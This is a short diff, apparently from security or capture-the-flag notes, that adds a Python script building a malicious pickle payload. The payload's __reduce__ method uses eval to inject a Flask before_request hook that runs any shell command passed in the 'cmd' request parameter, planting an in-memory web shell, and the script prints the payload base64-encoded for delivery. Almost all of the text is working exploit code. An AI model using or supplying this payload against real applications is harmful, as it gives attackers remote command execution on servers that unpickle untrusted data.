@@ -230,3 +230,18 @@ a = test()
 b = pickle.dumps(a)
 print(base64.b64encode(b))
 ```
+```
+import pickle
+import base64
+
+class Pet:
+    def __reduce__(self):
+        cmd_injection = "__import__('os').popen(request.args.get('cmd')).read()"
+        return eval, ("__import__('sys').modules['__main__'].__dict__['app']"
+                      ".before_request_funcs.setdefault(None, []).append(lambda :" + cmd_injection + ")",)
+
+# 创建类实例并序列化为pickle，再进行base64编码
+a = Pet()
+b = pickle.dumps(a)
+print(base64.b64encode(b).decode())
+```
